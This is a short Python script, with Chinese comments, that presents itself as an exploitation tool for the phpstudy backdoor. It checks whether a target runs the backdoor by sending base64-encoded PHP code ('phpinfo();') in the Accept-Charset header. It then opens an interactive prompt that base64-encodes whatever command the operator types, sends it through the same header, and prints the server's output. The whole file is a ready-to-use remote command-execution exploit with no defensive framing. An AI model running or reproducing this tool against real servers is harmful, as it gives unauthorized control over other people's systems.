# @Author：只因不值得


import requests
import base64
from pyquery import PyQuery

# 检测是否存在漏洞
def check(url):
    header = {
        "Accept-Charset":"cGhwaW5mbygpOw==",
        "Accept-Encoding":"gzip,deflate",
    }
    try:
        req = requests.get(url,headers=header)
        html = PyQuery(req.content)
        if 'phpinfo()' in html('title').text():
            print('[+] 存在漏洞\n')
            return True
        else:
            print('[-] 漏洞不存在\n')
            return False
    except:
        print("[-] Error")
        exit(0)

# 漏洞利用
def exp(url,payload):
    headers = {
        "Accept-Charset":payload,
        "Accept-Encoding":"gzip,deflate",
    }
    try:
        req = requests.get(url,headers=headers)
        if req.status_code == 200:
            req.encoding = 'gb2312'
            str = req.text
            html = PyQuery(str)
            results_p= html('title').parent().children('p')
            print(results_p.text()+"\n")
    except:
        print("[-] Error")
        exit(0)

if __name__ == "__main__":
    print("""
        phpstudy后门利用工具
    """)
    url = input("Url > ")
    if 'http' not in url:
        url = "http://" + url
    print("[+] Target: " + url)
    if check(url):
        while True:
            Payload = input("Cmd > ")
            if Payload == "q":
                exit(0)
            exp(url,base64.b64encode(Payload.encode('utf-8')))